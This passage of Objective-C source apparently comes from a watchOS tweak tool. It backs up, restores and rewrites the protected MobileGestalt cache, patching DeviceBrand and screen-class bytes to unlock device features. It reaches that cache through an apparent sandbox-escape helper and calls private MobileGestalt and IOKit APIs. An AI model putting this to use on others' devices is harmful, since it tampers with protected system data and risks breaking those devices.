        path = [bq_backups_directory() stringByAppendingPathComponent:[identifier stringByAppendingPathExtension:@"plist"]];
    }
    if (![data writeToFile:path atomically:YES] ||
        ![[NSData dataWithContentsOfFile:path] isEqualToData:data]) {
        if (err) *err = @"Backup could not be verified.";
        return nil;
    }
    BQLog(@"MG %@ backup created: %@ (%lu bytes)", kind, identifier, (unsigned long)data.length);
    return identifier;
}

NSString *BQCreateGestaltBackup(BOOL initial, NSString **err) {
    return bq_create_gestalt_backup(initial ? @"initial" : @"manual", err);
}

BOOL BQImportGestaltBackup(NSData *data, NSString **identifier, NSString **err) {
    if (identifier) *identifier = nil;

    if (!bq_valid_gestalt_data(data)) {
        if (err) *err = @"Imported backup is missing or has an invalid MobileGestalt structure.";
        return NO;
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *directory = bq_backups_directory();

    NSError *directoryError = nil;
    if (![fm createDirectoryAtPath:directory
       withIntermediateDirectories:YES
                        attributes:nil
                             error:&directoryError]) {
        if (err) *err = directoryError.localizedDescription ?: @"Could not create backup directory.";
        return NO;
    }

    NSString *backupID = [NSString stringWithFormat:@"external-%@", [NSUUID UUID].UUIDString];
    NSString *path = [directory stringByAppendingPathComponent:
                      [backupID stringByAppendingPathExtension:@"plist"]];

    // Create a new file only. Never replace an existing backup.
    NSError *writeError = nil;
    BOOL written = [data writeToFile:path options:NSDataWritingAtomic error:&writeError];

    if (!written) {
        if (err) *err = writeError.localizedDescription ?: @"Could not write imported backup.";
        return NO;
    }

    NSData *storedData = [NSData dataWithContentsOfFile:path];

    if (!storedData || ![storedData isEqualToData:data] ||
        !bq_valid_gestalt_data(storedData)) {
        [fm removeItemAtPath:path error:nil];
        if (err) *err = @"Imported backup failed verification and was removed.";
        return NO;
    }

    if (identifier) *identifier = backupID;

    BQLog(@"External MG backup imported: %@ (%lu bytes)",
          backupID, (unsigned long)storedData.length);

    return YES;
}

static BOOL bq_auto_backup(NSString **err) {
    return bq_create_gestalt_backup(@"auto", err) != nil;
}

NSArray<NSDictionary *> *BQListGestaltBackups(void) {
    NSMutableArray<NSDictionary *> *result = [NSMutableArray array];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (BQBackupExists()) {
        NSDictionary *attributes = [fm attributesOfItemAtPath:BQBackupPath() error:nil];
        [result addObject:@{ @"id": @"initial", @"date": attributes[NSFileCreationDate] ?: [NSDate distantPast], @"initial": @YES }];
    }
    for (NSString *name in [fm contentsOfDirectoryAtPath:bq_backups_directory() error:nil]) {
        NSString *identifier = name.stringByDeletingPathExtension;
        BOOL automatic = [identifier hasPrefix:@"auto-"];
        BOOL manual = [identifier hasPrefix:@"manual-"];
        BOOL external = [identifier hasPrefix:@"external-"];

        NSString *uuid = automatic ? [identifier substringFromIndex:5] :
                         manual ? [identifier substringFromIndex:7] :
                         external ? [identifier substringFromIndex:9] :
                         identifier;

        if (![name.pathExtension isEqualToString:@"plist"] ||
            ![[NSUUID alloc] initWithUUIDString:uuid]) {
            continue;
        }

        NSString *path = [bq_backups_directory() stringByAppendingPathComponent:name];

        if (!bq_valid_gestalt_data([NSData dataWithContentsOfFile:path])) {
            continue;
        }

        NSDictionary *attributes = [fm attributesOfItemAtPath:path error:nil];

        NSString *kind = external ? @"External" :
                         automatic ? @"Automatic" : @"Manual";

        [result addObject:@{
            @"id": identifier,
            @"date": attributes[NSFileCreationDate] ?: [NSDate distantPast],
            @"initial": @NO,
            @"kind": kind
        }];
    }
    [result sortUsingComparator:^NSComparisonResult(NSDictionary *a, NSDictionary *b) {
        if ([a[@"initial"] boolValue] != [b[@"initial"] boolValue]) return [a[@"initial"] boolValue] ? NSOrderedAscending : NSOrderedDescending;
        return [b[@"date"] compare:a[@"date"]];
    }];
    return result;
}

NSString *BQMobileGestaltPath(void) {
    return [kMGCaches stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
}

BOOL BQInPlaceWrite(void) {
    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:@"BQInPlaceWrite"];
    return n ? n.boolValue : YES;
}

void BQSetInPlaceWrite(BOOL on) {
    [[NSUserDefaults standardUserDefaults] setBool:on forKey:@"BQInPlaceWrite"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    BQLog(@"in-place write = %d", on);
}

static BOOL bq_write_all(int fd, const uint8_t *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        ssize_t n = write(fd, buf + off, len - off);
        if (n <= 0) return NO;
        off += (size_t)n;
    }
    return YES;
}

static BOOL bq_write_data(NSString *path, NSData *data, NSString **err) {
    NSData *original = [NSData dataWithContentsOfFile:path];
    if (BQInPlaceWrite()) {
        int fd = open(path.fileSystemRepresentation, O_RDWR | O_CLOEXEC | O_NOFOLLOW);
        if (fd >= 0) {
            BOOL ok = (ftruncate(fd, 0) == 0) &&
                      bq_write_all(fd, data.bytes, data.length) &&
                      (fsync(fd) == 0);
            if (!ok && original.length) {
                BQLog(@"in-place write failed; rolling back original (%lu bytes)", (unsigned long)original.length);
                ftruncate(fd, 0);
                lseek(fd, 0, SEEK_SET);
                bq_write_all(fd, original.bytes, original.length);
                fsync(fd);
            }
            close(fd);
            if (ok) return YES;
            BQLog(@"in-place write failed, falling back to atomic");
        } else {
            BQLog(@"in-place open failed: %s", strerror(errno));
        }
    }
    NSString *tmp = [path stringByAppendingString:@".bqtmp"];
    if (![data writeToFile:tmp atomically:NO]) {
        if (err) *err = NSLocalizedString(@"temp write failed", nil);
        return NO;
    }
    int fd = open(tmp.fileSystemRepresentation, O_RDONLY);
    if (fd >= 0) { fsync(fd); close(fd); }
    int r = rename(tmp.fileSystemRepresentation, path.fileSystemRepresentation);
    if (r != 0) {
        if (err) *err = [NSString stringWithFormat:NSLocalizedString(@"rename failed: %@", nil), [NSString stringWithUTF8String:strerror(errno)]];
        unlink(tmp.fileSystemRepresentation);
        return NO;
    }
    return YES;
}

NSMutableDictionary *BQLoadGestalt(NSString **err) {
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return nil;
    }
    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    NSMutableDictionary *dict = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
    BQEndEscape(h);
    if (!dict) {
        if (err) *err = NSLocalizedString(@"MobileGestalt plist missing or invalid", nil);
        return nil;
    }
    BQLog(@"MG loaded: %lu CacheExtra key(s), %lu byte(s)",
          (unsigned long)[dict[@"CacheExtra"] count], (unsigned long)[dict[@"CacheData"] length]);
    return dict;
}

BOOL BQSaveGestalt(NSDictionary *dict, NSString **err) {
    if (![dict isKindOfClass:[NSDictionary class]]) {
        if (err) *err = NSLocalizedString(@"invalid dictionary", nil);
        return NO;
    }
    NSError *e = nil;
    NSData *data = [NSPropertyListSerialization dataWithPropertyList:dict
                                                              format:NSPropertyListBinaryFormat_v1_0
                                                             options:0 error:&e];
    if (!data.length) {
        if (err) *err = [NSString stringWithFormat:NSLocalizedString(@"serialize failed: %@", nil), e];
        return NO;
    }
    if (!bq_auto_backup(err)) return NO;
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return NO;
    }
    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    BOOL ok = bq_write_data(plist, data, err);
    if (ok) {
        NSMutableDictionary *check = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
        if (!check) {
            ok = NO;
            if (err) *err = NSLocalizedString(@"post-write verification failed", nil);
        } else {
            BQLog(@"MG saved: %lu bytes, %lu CacheExtra keys",
                  (unsigned long)data.length, (unsigned long)[check[@"CacheExtra"] count]);
        }
    }
    BQEndEscape(h);
    return ok;
}

BOOL BQRestoreGestalt(NSString **err) {
    return BQRestoreGestaltBackup(@"initial", err);
}

BOOL BQRestoreGestaltBackup(NSString *identifier, NSString **err) {
    NSString *path = nil;
    if ([identifier isEqualToString:@"initial"]) path = BQBackupPath();
    else if ([identifier hasPrefix:@"auto-"] ||
             [identifier hasPrefix:@"manual-"] ||
             [identifier hasPrefix:@"external-"] ||
             [[NSUUID alloc] initWithUUIDString:identifier]) {
        NSString *uuid = [identifier hasPrefix:@"auto-"] ? [identifier substringFromIndex:5] :
                         [identifier hasPrefix:@"manual-"] ? [identifier substringFromIndex:7] :
                         [identifier hasPrefix:@"external-"] ? [identifier substringFromIndex:9] :
                         identifier;
        if (![[NSUUID alloc] initWithUUIDString:uuid]) {
            if (err) *err = @"Invalid backup identifier.";
            return NO;
        }
        path = [bq_backups_directory() stringByAppendingPathComponent:[identifier stringByAppendingPathExtension:@"plist"]];
    }
    NSData *backup = path ? [NSData dataWithContentsOfFile:path] : nil;
    if (!bq_valid_gestalt_data(backup)) {
        if (err) *err = @"Selected backup is missing or invalid.";
        return NO;
    }
    NSDictionary *backupPlist = [NSPropertyListSerialization propertyListWithData:backup options:0 format:NULL error:NULL];
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return NO;
    }
    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    NSDictionary *current = [NSDictionary dictionaryWithContentsOfFile:plist];
    if (![current[@"CacheUUID"] isEqual:backupPlist[@"CacheUUID"]] ||
        [current[@"CacheData"] length] != [backupPlist[@"CacheData"] length]) {
        BQEndEscape(h);
        if (err) *err = @"Backup cache layout does not match this watch.";
        return NO;
    }
    BQEndEscape(h);
    if (!bq_auto_backup(err)) return NO;
    h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return NO;
    }
    plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    current = [NSDictionary dictionaryWithContentsOfFile:plist];
    if (![current[@"CacheUUID"] isEqual:backupPlist[@"CacheUUID"]] ||
        [current[@"CacheData"] length] != [backupPlist[@"CacheData"] length]) {
        BQEndEscape(h);
        if (err) *err = @"MobileGestalt layout changed before restore; no data was written.";
        return NO;
    }
    BOOL ok = bq_write_data(plist, backup, err);
    if (ok) {
        NSData *check = [NSData dataWithContentsOfFile:plist];
        ok = [check isEqualToData:backup];
        if (!ok && err) *err = @"Restored file did not match the selected backup.";
        BQLog(@"MG restored from %@: %lu bytes ok=%d", identifier, (unsigned long)backup.length, ok);
    }
    BQEndEscape(h);
    return ok;
}

BOOL BQDeleteGestaltBackup(NSString *identifier, NSString **err) {
    if ([identifier isEqualToString:@"initial"]) {
        if (err) *err = @"The initial backup is protected and cannot be deleted.";
        return NO;
    }

    BOOL automatic = [identifier hasPrefix:@"auto-"];
    BOOL manual = [identifier hasPrefix:@"manual-"];
    BOOL external = [identifier hasPrefix:@"external-"];

    if (!automatic && !manual && !external) {
        if (err) *err = @"Invalid backup identifier.";
        return NO;
    }

    NSString *uuid = automatic ? [identifier substringFromIndex:5] :
                     manual ? [identifier substringFromIndex:7] :
                     [identifier substringFromIndex:9];

    if (![[NSUUID alloc] initWithUUIDString:uuid]) {
        if (err) *err = @"Invalid backup identifier.";
        return NO;
    }

    NSString *path = [bq_backups_directory()
        stringByAppendingPathComponent:
            [identifier stringByAppendingPathExtension:@"plist"]];

    NSFileManager *fm = [NSFileManager defaultManager];

    if (![fm fileExistsAtPath:path]) {
        if (err) *err = @"Selected backup no longer exists.";
        return NO;
    }

    NSError *removeError = nil;

    if (![fm removeItemAtPath:path error:&removeError]) {
        if (err) *err = removeError.localizedDescription ?: @"Backup could not be deleted.";
        return NO;
    }

    BQLog(@"MG backup deleted: %@", identifier);
    return YES;
}

typedef struct {
    const char *build, *cacheUUID;
    NSUInteger dataLength, valueOffset, presentOffset, screenOffset, screenPresentOffset, presenceBase;
    NSUInteger aodIndex, aodTimeIndex, hzIndex, actionIndex, gestureIndex, keyboardIndex, vibrancyIndex, noiseIndex;
    BOOL recoveryVerified;
} BQDeviceBrandLayout;

// Refuse missing or malformed bundled data rather than writing an assumed layout.
static NSDictionary *bq_buildData(NSString *resource, NSString *build) {
    NSString *path = [[NSBundle mainBundle] pathForResource:resource ofType:@"plist"];
    id root = path ? [NSDictionary dictionaryWithContentsOfFile:path] : nil;
    if (![root isKindOfClass:[NSDictionary class]]) return nil;
    id builds = root[@"Builds"];
    id entry = [builds isKindOfClass:[NSDictionary class]] ? builds[build] : nil;
    return [entry isKindOfClass:[NSDictionary class]] ? entry : nil;
}

static const BQDeviceBrandLayout *bq_layoutForBuild(const char *build) {
    if (!build) return NULL;
    static NSDictionary<NSString *, NSValue *> *layouts;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSString *path = [[NSBundle mainBundle] pathForResource:@"MGOffsets" ofType:@"plist"];
        id root = path ? [NSDictionary dictionaryWithContentsOfFile:path] : nil;
        NSDictionary *builds = [root isKindOfClass:[NSDictionary class]] && [root[@"Builds"] isKindOfClass:[NSDictionary class]] ? root[@"Builds"] : @{};
        NSMutableDictionary *parsed = [NSMutableDictionary dictionary];
        for (id name in builds) {
            NSDictionary *entry = [builds[name] isKindOfClass:[NSDictionary class]] ? builds[name] : nil;
            NSDictionary *indexes = [entry[@"Indexes"] isKindOfClass:[NSDictionary class]] ? entry[@"Indexes"] : nil;
            NSString *uuid = entry[@"CacheUUID"];
            NSArray *fields = @[@"CacheDataLength", @"DeviceBrandOffset", @"DeviceBrandPresentOffset", @"ScreenClassOffset", @"ScreenClassPresentOffset", @"PresenceBase"];
            NSArray *indexKeys = @[@"AlwaysOnDisplay", @"AlwaysOnTime", @"AlwaysOnDisplayFlipbook", @"ActionButton", @"DoubleTap", @"Keyboard", @"AODVibrancy", @"EnvironmentalDosimetry"];
            if (![name isKindOfClass:[NSString class]] || ![uuid isKindOfClass:[NSString class]] || ![[NSUUID alloc] initWithUUIDString:uuid] || ![entry[@"RecoveryVerified"] isKindOfClass:[NSNumber class]]) continue;
            BOOL valid = YES;
            for (NSString *field in fields) if (![entry[field] isKindOfClass:[NSNumber class]] || [entry[field] longLongValue] < 0) valid = NO;
            for (NSString *key in indexKeys) if (![indexes[key] isKindOfClass:[NSNumber class]] || [indexes[key] longLongValue] < 0) valid = NO;
            if (!valid) continue;
            NSUInteger length = [entry[@"CacheDataLength"] unsignedIntegerValue], base = [entry[@"PresenceBase"] unsignedIntegerValue];
            if (length < 8 || length > 1024 * 1024 || base >= length || [entry[@"DeviceBrandOffset"] unsignedIntegerValue] > length - 4 || [entry[@"ScreenClassOffset"] unsignedIntegerValue] > length - 4 || [entry[@"DeviceBrandPresentOffset"] unsignedIntegerValue] >= length || [entry[@"ScreenClassPresentOffset"] unsignedIntegerValue] >= length) continue;
            for (NSString *key in indexKeys) { NSUInteger n = [indexes[key] unsignedIntegerValue]; if (n >= length - base || n > (length - 8) / 8) valid = NO; }
            if (!valid) continue;
            BQDeviceBrandLayout *item = calloc(1, sizeof(*item));
            if (!item) continue;
            item->build = strdup([name UTF8String]); item->cacheUUID = strdup(uuid.UTF8String);
            item->dataLength = length; item->valueOffset = [entry[@"DeviceBrandOffset"] unsignedIntegerValue]; item->presentOffset = [entry[@"DeviceBrandPresentOffset"] unsignedIntegerValue];
            item->screenOffset = [entry[@"ScreenClassOffset"] unsignedIntegerValue]; item->screenPresentOffset = [entry[@"ScreenClassPresentOffset"] unsignedIntegerValue]; item->presenceBase = base;
            item->aodIndex = [indexes[@"AlwaysOnDisplay"] unsignedIntegerValue]; item->aodTimeIndex = [indexes[@"AlwaysOnTime"] unsignedIntegerValue]; item->hzIndex = [indexes[@"AlwaysOnDisplayFlipbook"] unsignedIntegerValue];
            item->actionIndex = [indexes[@"ActionButton"] unsignedIntegerValue]; item->gestureIndex = [indexes[@"DoubleTap"] unsignedIntegerValue]; item->keyboardIndex = [indexes[@"Keyboard"] unsignedIntegerValue];
            item->vibrancyIndex = [indexes[@"AODVibrancy"] unsignedIntegerValue]; item->noiseIndex = [indexes[@"EnvironmentalDosimetry"] unsignedIntegerValue]; item->recoveryVerified = [entry[@"RecoveryVerified"] boolValue];
            parsed[name] = [NSValue valueWithPointer:item];
        }
        layouts = [parsed copy];
    });
    return [layouts[[NSString stringWithUTF8String:build]] pointerValue];
}

static const BQDeviceBrandLayout *bq_currentLayout(void) {
    char build[128] = {0}; size_t length = sizeof(build);
    return sysctlbyname("kern.osversion", build, &length, NULL, 0) == 0 ? bq_layoutForBuild(build) : NULL;
}

static BOOL bq_buildDefault(const char *build, NSString *key, uint32_t *value) {
    NSDictionary *entry = bq_buildData(@"MGDefaults", [NSString stringWithUTF8String:build]);
    id number = entry[key];
    if (![number isKindOfClass:[NSNumber class]] || [number longLongValue] < 0 || [number unsignedLongLongValue] > UINT32_MAX) return NO;
    if (value) *value = [number unsignedIntValue];
    return YES;
}

static BOOL bq_recoverNativeFace(BOOL recoverBrand, NSString **err);
static BOOL bq_recoverNativeControl(NSString *key, NSString **err);
static BOOL bq_recoverNativeAdditional(NSString *key, NSString **err);
static BOOL bq_recoverNativeAOD(BOOL secondsOnly, NSString **err);

BOOL BQSetHermesEnabled(BOOL enabled, NSString **err) {
    if (!enabled && !BQBackupExists()) return bq_recoverNativeFace(YES, err);
    if (!BQBackupExists()) {
        if (err) *err = NSLocalizedString(@"Back up MobileGestalt first.", nil);
        return NO;
    }
    NSData *backup = [NSData dataWithContentsOfFile:BQBackupPath()];
    id backupPlist = backup ? [NSPropertyListSerialization propertyListWithData:backup options:0 format:NULL error:NULL] : nil;
    if (![backupPlist isKindOfClass:[NSDictionary class]]) {
        if (err) *err = NSLocalizedString(@"The MobileGestalt backup is invalid.", nil);
        return NO;
    }
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    char build[128] = {0};
    size_t buildLength = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &buildLength, NULL, 0) != 0) {
        if (err) *err = NSLocalizedString(@"Could not identify the watchOS build.", nil);
        return NO;
    }
    const BQDeviceBrandLayout *layout = bq_layoutForBuild(build);
    if (!layout) {
        if (err) *err = [NSString stringWithFormat:NSLocalizedString(@"DeviceBrand CacheData layout is not verified for build %@.", nil), [NSString stringWithUTF8String:build]];
        return NO;
    }
    id extra = plist[@"CacheExtra"];
    id cacheData = plist[@"CacheData"];
    id backupExtra = backupPlist[@"CacheExtra"];
    id backupCacheData = backupPlist[@"CacheData"];
    if (!enabled && (![backupExtra isKindOfClass:[NSDictionary class]] ||
        ![backupCacheData isKindOfClass:[NSData class]] ||
        ![backupPlist[@"CacheUUID"] isEqual:[NSString stringWithUTF8String:layout->cacheUUID]] ||
        [backupCacheData length] != layout->dataLength ||
        ((const uint8_t *)[backupCacheData bytes])[layout->presentOffset] != 1)) {
        return bq_recoverNativeFace(YES, err);
    }
    if (![extra isKindOfClass:[NSDictionary class]] || ![cacheData isKindOfClass:[NSData class]] ||
        ![backupExtra isKindOfClass:[NSDictionary class]] || ![backupCacheData isKindOfClass:[NSData class]] ||
        ![plist[@"CacheUUID"] isEqual:[NSString stringWithUTF8String:layout->cacheUUID]] ||
        ![backupPlist[@"CacheUUID"] isEqual:[NSString stringWithUTF8String:layout->cacheUUID]] ||
        [cacheData length] != layout->dataLength || [backupCacheData length] != layout->dataLength ||
        layout->valueOffset > layout->dataLength - sizeof(uint32_t) ||
        layout->presentOffset >= layout->dataLength) {
        if (err) *err = NSLocalizedString(@"Unexpected MobileGestalt cache layout; no changes written.", nil);
        return NO;
    }
    const NSUInteger valueOffset = layout->valueOffset;
    const NSUInteger presentOffset = layout->presentOffset;
    NSMutableData *modifiedData = [cacheData mutableCopy];
    uint8_t *bytes = modifiedData.mutableBytes;
    const uint8_t *backupBytes = (const uint8_t *)[backupCacheData bytes];
    if (enabled && bytes[presentOffset] != 1) {
        if (err) *err = NSLocalizedString(@"DeviceBrand is not present in CacheData; no changes written.", nil);
        return NO;
    }
    // DeviceBrand is a little-endian signed 32-bit integer, in an 8-byte slot.
    uint32_t enabledBrand = 0;
    if (!bq_buildDefault(build, @"HermesEnabledDeviceBrand", &enabledBrand)) {
        if (err) *err = NSLocalizedString(@"DeviceBrand CacheData layout is unavailable or unverified.", nil);
        return NO;
    }
    uint8_t one[] = {enabledBrand & 0xff, (enabledBrand >> 8) & 0xff, (enabledBrand >> 16) & 0xff, (enabledBrand >> 24) & 0xff};
    if (enabled) memcpy(bytes + valueOffset, one, sizeof(one));
    else {
        memcpy(bytes + valueOffset, backupBytes + valueOffset, sizeof(uint32_t));
        bytes[presentOffset] = backupBytes[presentOffset];
    }
    NSMutableDictionary *changed = [extra mutableCopy];
    NSString *brandKey = @"fuKL2rMywRgQF1wowOA/cg";
    id originalBrandOverride = backupExtra[brandKey];
    if (enabled || !originalBrandOverride) [changed removeObjectForKey:brandKey];
    else changed[brandKey] = originalBrandOverride;
    plist[@"CacheData"] = modifiedData;
    plist[@"CacheExtra"] = changed;
    if (!BQSaveGestalt(plist, err)) return NO;
    NSMutableDictionary *check = BQLoadGestalt(err);
    if (!check) return NO;
    NSData *saved = check[@"CacheData"];
    NSDictionary *savedExtra = check[@"CacheExtra"];
    if (![saved isKindOfClass:[NSData class]] || saved.length != layout->dataLength ||
        ![savedExtra isKindOfClass:[NSDictionary class]]) {
        if (err) *err = NSLocalizedString(@"The cache was written, but DeviceBrand could not be verified.", nil);
        return NO;
    }
    const uint8_t *savedBytes = (const uint8_t *)saved.bytes;
    BOOL dataMatches = enabled
        ? (memcmp(savedBytes + valueOffset, one, sizeof(one)) == 0 && savedBytes[presentOffset] == 1)
        : (memcmp(savedBytes + valueOffset, backupBytes + valueOffset, sizeof(uint32_t)) == 0 &&
           savedBytes[presentOffset] == backupBytes[presentOffset]);
    id expectedBrandOverride = enabled ? nil : originalBrandOverride;
    BOOL extraMatches = expectedBrandOverride ? [savedExtra[brandKey] isEqual:expectedBrandOverride]
                                               : savedExtra[brandKey] == nil;
    if (!dataMatches || !extraMatches) {
        if (err) *err = NSLocalizedString(@"The cache was written, but DeviceBrand could not be verified.", nil);
        return NO;
    }
    return YES;
}

BOOL BQGetHermesEnabled(BOOL *enabled, NSString **err) {
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    char build[128] = {0};
    size_t buildLength = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &buildLength, NULL, 0) != 0) {
        if (err) *err = NSLocalizedString(@"Could not identify the watchOS build.", nil);
        return NO;
    }
    const BQDeviceBrandLayout *layout = bq_layoutForBuild(build);
    NSData *cacheData = plist[@"CacheData"];
    if (!layout || ![cacheData isKindOfClass:[NSData class]] ||
        ![plist[@"CacheUUID"] isEqual:[NSString stringWithUTF8String:layout->cacheUUID]] ||
        cacheData.length != layout->dataLength || layout->valueOffset > layout->dataLength - sizeof(uint32_t)) {
        if (err) *err = NSLocalizedString(@"DeviceBrand CacheData layout is unavailable or unverified.", nil);
        return NO;
    }
    const uint8_t *bytes = (const uint8_t *)cacheData.bytes;
    uint32_t expected = 0, actual = 0;
    if (!bq_buildDefault(build, @"HermesEnabledDeviceBrand", &expected)) {
        if (err) *err = NSLocalizedString(@"DeviceBrand CacheData layout is unavailable or unverified.", nil);
        return NO;
    }
    memcpy(&actual, bytes + layout->valueOffset, sizeof(actual));
    BOOL isHermes = bytes[layout->presentOffset] == 1 && actual == expected;
    if (enabled) *enabled = isHermes;
    return YES;
}

// main-screen-class CacheData layouts derived from each build’s MobileGestalt table.
static BOOL bq_ultraCache(NSDictionary *plist, NSMutableData **dataOut, NSUInteger *valueOffset, NSUInteger *presentOffset, NSString **err) {
    char build[128] = {0};
    size_t buildLength = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &buildLength, NULL, 0) != 0) {
        if (err) *err = NSLocalizedString(@"Could not identify the watchOS build.", nil);
        return NO;
    }
    const BQDeviceBrandLayout *layout = bq_layoutForBuild(build);
    NSString *uuid = layout ? [NSString stringWithUTF8String:layout->cacheUUID] : nil;
    NSUInteger length = layout ? layout->dataLength : 0;
    NSUInteger value = layout ? layout->screenOffset : 0;
    NSUInteger present = layout ? layout->screenPresentOffset : 0;
    NSData *data = plist[@"CacheData"];
    if (!uuid || ![plist[@"CacheUUID"] isEqual:uuid] || ![data isKindOfClass:[NSData class]] || data.length != length || ![plist[@"CacheExtra"] isKindOfClass:[NSDictionary class]]) {
        if (err) *err = NSLocalizedString(@"Ultra Faces cache layout is not supported on this watchOS build.", nil);
        return NO;
    }
    if (dataOut) *dataOut = [data mutableCopy];
    if (valueOffset) *valueOffset = value;
    if (presentOffset) *presentOffset = present;
    return YES;
}

static void bq_native_libraries(void **mgOut, void **ioOut) {
    static void *mg, *io;
    static dispatch_once_t loadOnce;
    dispatch_once(&loadOnce, ^{
        mg = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_LAZY);
        io = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        if (!io) io = dlopen("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_LAZY);
    });
    if (mgOut) *mgOut = mg;
    if (ioOut) *ioOut = io;
}

// Query face handlers in a separate empty in-memory cache. A cache miss does not
// make every answer independent of the global cache: main-screen-class reads
// the global MainScreenStaticInfo. Recompute that dependency in the empty cache
// and compare it, and verify DeviceBrand against its device-tree source.
// These private APIs may be unavailable or restricted; then nothing is written.
static BOOL bq_recoverNativeFace(BOOL recoverBrand, NSString **err) {
    NSMutableDictionary *plist = BQLoadGestalt(err);
    NSMutableData *data = nil;
    NSUInteger screenOffset = 0, screenPresent = 0;
    if (!plist || !bq_ultraCache(plist, &data, &screenOffset, &screenPresent, err)) return NO;

    char build[128] = {0}; size_t buildLength = sizeof(build);
    const BQDeviceBrandLayout *layout = sysctlbyname("kern.osversion", build, &buildLength, NULL, 0) == 0 ? bq_layoutForBuild(build) : NULL;
    if (!layout || !layout->recoveryVerified || ![plist[@"CacheUUID"] isEqual:[NSString stringWithUTF8String:layout->cacheUUID]] ||
        data.length != layout->dataLength || layout->valueOffset > data.length - sizeof(int32_t) ||
        layout->presentOffset >= data.length || screenOffset > data.length - sizeof(int32_t) || screenPresent >= data.length) {
        if (err) *err = NSLocalizedString(@"Native face recovery is unavailable for this watchOS build.", nil);
        return NO;
    }
    uint8_t *bytes = data.mutableBytes;
    if (bytes[layout->presentOffset] != 1 && bytes[screenPresent] != 1) {
        if (err) *err = NSLocalizedString(@"The required face values are missing from the cache; no changes were made.", nil);
        return NO;
    }

    void *mg = NULL, *io = NULL;
    bq_native_libraries(&mg, &io);
    void *(*createCache)(void *, const void **, const void **, long, void *) = mg ? dlsym(mg, "MGCreateInMemoryCache") : NULL;
    CFTypeRef (*copyAnswer)(CFStringRef, void *, void *, int *) = mg ? dlsym(mg, "MGCopyAnswerWithCache") : NULL;
    void (*destroyCache)(void *) = mg ? dlsym(mg, "MGCacheDestroy") : NULL;
    uint32_t (*entryFromPath)(uint32_t, const char *) = io ? dlsym(io, "IORegistryEntryFromPath") : NULL;
    CFTypeRef (*copyProperty)(uint32_t, CFStringRef, CFAllocatorRef, uint32_t) = io ? dlsym(io, "IORegistryEntryCreateCFProperty") : NULL;
    int (*releaseObject)(uint32_t) = io ? dlsym(io, "IOObjectRelease") : NULL;
    if (!createCache || !copyAnswer || !destroyCache) {
        if (err) *err = NSLocalizedString(@"Could not read the watch's original face values; no changes were made.", nil);
        return NO;
    }
    uint32_t entry = entryFromPath && copyProperty && releaseObject ? entryFromPath(0, "IODeviceTree:/chosen") : 0;
    CFTypeRef property = entry ? copyProperty(entry, CFSTR("marketing-software-behavior"), kCFAllocatorDefault, 0) : NULL;
    if (entry) releaseObject(entry);
    int32_t expectedBrand = -1;
    BOOL validProperty = NO;
    if (property && CFGetTypeID(property) == CFDataGetTypeID()) {
        uint32_t maxBrand = 0;
        BOOL hasMaximum = bq_buildDefault(build, @"MaxDeviceBrand", &maxBrand) && maxBrand <= UINT8_MAX && maxBrand > 0;
        CFIndex length = CFDataGetLength(property);
        if (hasMaximum && length >= 0) validProperty = BQRecoveryParseDeviceBrand(CFDataGetBytePtr(property), (size_t)length, maxBrand, &expectedBrand);
    }
    if (property) CFRelease(property);
    void *cache = createCache(NULL, NULL, NULL, 0, NULL);
    if (!cache) {
        if (err) *err = NSLocalizedString(@"Could not read the watch's original face values; no changes were made.", nil);
        return NO;
    }
    int brandError = 0, screenError = 0, screenInfoError = 0;
    CFTypeRef brand = copyAnswer(CFSTR("DeviceBrand"), NULL, cache, &brandError);
    CFTypeRef screen = copyAnswer(CFSTR("main-screen-class"), NULL, cache, &screenError);
    CFTypeRef screenInfo = copyAnswer(CFSTR("MainScreenStaticInfo"), NULL, cache, &screenInfoError);
    int32_t nativeBrand = -1, nativeScreen = -1;
    int32_t screenInfoClass = -1;
    BOOL validScreenInfo = screenInfo && !screenInfoError && CFGetTypeID(screenInfo) == CFDataGetTypeID() && CFDataGetLength(screenInfo) == 24;
    if (validScreenInfo) memcpy(&screenInfoClass, CFDataGetBytePtr(screenInfo) + 20, sizeof(screenInfoClass));
    BOOL validBrand = bytes[layout->presentOffset] == 1 && validProperty && brand && !brandError &&
        CFGetTypeID(brand) == CFNumberGetTypeID() &&
        CFNumberGetValue((CFNumberRef)brand, kCFNumberSInt32Type, &nativeBrand) && nativeBrand == expectedBrand;
    BOOL validScreen = bytes[screenPresent] == 1 && screen && !screenError &&
        CFGetTypeID(screen) == CFNumberGetTypeID() &&
        CFNumberGetValue((CFNumberRef)screen, kCFNumberSInt32Type, &nativeScreen) &&
        validScreenInfo && nativeScreen == screenInfoClass && nativeScreen >= 0 && nativeScreen < 256;
    if (brand) CFRelease(brand);
    if (screen) CFRelease(screen);
    if (screenInfo) CFRelease(screenInfo);
    destroyCache(cache);
    if (recoverBrand ? !validBrand : !validScreen) {
